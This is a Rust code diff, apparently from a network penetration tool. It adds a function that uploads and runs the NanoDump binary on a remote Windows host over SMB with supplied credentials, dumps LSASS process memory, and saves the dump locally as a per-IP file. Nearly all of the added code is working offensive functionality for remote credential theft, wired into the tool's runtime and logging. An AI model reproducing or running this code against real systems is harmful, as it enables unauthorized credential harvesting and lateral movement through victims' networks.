@@ -8,7 +8,7 @@ use netraze_protocols::smb::connection::is_port_open;
 use netraze_protocols::smb::{
     SmbClient, SmbCredential, SmbScanResult, create_directory, delete_remote_directory,
     delete_remote_file, download_file, enum_av, execute_command_live, list_directory,
-    remote_dump_lsa, remote_dump_sam, smb_fingerprint, upload_file,
+    remote_dump_lsa, remote_dump_sam, remote_lsass_dump, smb_fingerprint, upload_file,
 };
 use netraze_protocols::targets::parse_target_list;
 
@@ -961,6 +961,110 @@ impl RuntimeServices {
                 entries,
                 error,
             });
+        });
+    }
+
+    pub fn spawn_dump_nanodump(
+        &self,
+        host_node_id: usize,
+        ip: String,
+        hostname: String,
+        cred: CredentialRecord,
+        binary_path: String,
+    ) {
+        let tx = self.log_tx.clone();
+        let _ = tx.send(RuntimeEvent::Log {
+            level: LogLevel::Info,
+            message: format!("{ip}: NanoDump LSASS en cours..."),
+        });
+
+        let ip2 = ip.clone();
+        let hostname2 = hostname.clone();
+        let smb_cred = cred_to_smb(&cred);
+        self.runtime.spawn(async move {
+            let binary_bytes = match std::fs::read(&binary_path) {
+                Ok(b) => b,
+                Err(e) => {
+                    let _ = tx.send(RuntimeEvent::Log {
+                        level: LogLevel::Error,
+                        message: format!("{ip2}: NanoDump binary read failed: {e}"),
+                    });
+                    let _ = tx.send(RuntimeEvent::DumpResult {
+                        host_node_id,
+                        ip: ip2,
+                        hostname: hostname2,
+                        dump_type: "NANODUMP".to_string(),
+                        entries: Vec::new(),
+                        error: Some(format!("cannot read binary: {e}")),
+                    });
+                    return;
+                }
+            };
+
+            let tx2 = tx.clone();
+            let ip3 = ip2.clone();
+            let log_fn: Box<dyn Fn(&str) + Send + Sync> = Box::new(move |line: &str| {
+                let _ = tx2.send(RuntimeEvent::Log {
+                    level: LogLevel::Info,
+                    message: format!("{ip3}: [nanodump] {line}"),
+                });
+            });
+
+            let result = remote_lsass_dump(&ip2, &smb_cred, &binary_bytes, "--fork", &*log_fn).await;
+
+            match result {
+                Ok(r) => {
+                    let safe_ip = ip2.replace(':', "_").replace('.', "_");
+                    let dmp_path = format!("lsass_{safe_ip}.dmp");
+                    match std::fs::write(&dmp_path, &r.dump_bytes) {
+                        Ok(()) => {
+                            let _ = tx.send(RuntimeEvent::Log {
+                                level: LogLevel::Success,
+                                message: format!(
+                                    "{ip2}: NanoDump — {} bytes → {dmp_path}",
+                                    r.dump_bytes.len()
+                                ),
+                            });
+                            let _ = tx.send(RuntimeEvent::DumpResult {
+                                host_node_id,
+                                ip: ip2,
+                                hostname: hostname2,
+                                dump_type: "NANODUMP".to_string(),
+                                entries: vec![dmp_path],
+                                error: None,
+                            });
+                        }
+                        Err(e) => {
+                            let _ = tx.send(RuntimeEvent::Log {
+                                level: LogLevel::Error,
+                                message: format!("{ip2}: NanoDump save failed: {e}"),
+                            });
+                            let _ = tx.send(RuntimeEvent::DumpResult {
+                                host_node_id,
+                                ip: ip2,
+                                hostname: hostname2,
+                                dump_type: "NANODUMP".to_string(),
+                                entries: Vec::new(),
+                                error: Some(format!("save failed: {e}")),
+                            });
+                        }
+                    }
+                }
+                Err(e) => {
+                    let _ = tx.send(RuntimeEvent::Log {
+                        level: LogLevel::Error,
+                        message: format!("{ip2}: NanoDump failed: {e}"),
+                    });
+                    let _ = tx.send(RuntimeEvent::DumpResult {
+                        host_node_id,
+                        ip: ip2,
+                        hostname: hostname2,
+                        dump_type: "NANODUMP".to_string(),
+                        entries: Vec::new(),
+                        error: Some(e),
+                    });
+                }
+            }
         });
     }
 
